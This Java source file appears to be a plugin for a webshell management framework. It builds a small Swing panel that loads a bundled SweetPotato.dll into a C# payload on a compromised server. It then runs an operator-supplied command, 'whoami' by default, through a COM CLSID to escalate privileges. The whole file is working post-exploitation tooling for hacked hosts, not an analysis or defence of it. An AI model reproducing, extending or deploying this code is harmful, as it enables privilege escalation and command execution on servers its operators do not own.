package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(Name = "SweetPotato", payloadName = "CShapDynamicPayload")
public class SweetPotato implements Plugin {
    private static final String CLASS_NAME = "SweetPotato.Run";
    private JLabel clsidLabel = new JLabel("clsid :");
    private JTextField clsidtTextField = new JTextField("4991D34B-80A1-4291-83B6-3328366B9097");
    private JLabel commandLabel = new JLabel("command :");
    private JTextField commandTextField = new JTextField(35);
    private Encoding encoding;
    private JButton loadButton = new JButton("Load");
    private boolean loadState;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private RTextArea resultTextArea = new RTextArea();
    private JButton runButton = new JButton("Run");
    private ShellEntity shellEntity;
    private JSplitPane splitPane = new JSplitPane();

    public SweetPotato() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.clsidLabel);
        topPanel.add(this.clsidtTextField);
        topPanel.add(this.commandLabel);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
             

            public void componentResized(ComponentEvent e) {
                SweetPotato.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("whoami");
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        if (!this.loadState) {
            try {
                InputStream inputStream = getClass().getClassLoader().getResourceAsStream("shell/asp/assets/SweetPotato.dll");
                byte[] data = functions.hexToByte(new String(functions.readInputStream(inputStream)));
                inputStream.close();
                if (this.payload.include(CLASS_NAME, data)) {
                    this.loadState = true;
                    JOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
                    return;
                }
                JOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
            } catch (Exception e) {
                Log.error(e);
                JOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
            }
        } else {
            JOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", this.commandTextField.getText());
        parameter.add("clsid", this.clsidtTextField.getText().trim().getBytes());
        this.resultTextArea.setText(this.encoding.Decoding(this.payload.evalFunc(CLASS_NAME, "run", parameter)));
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
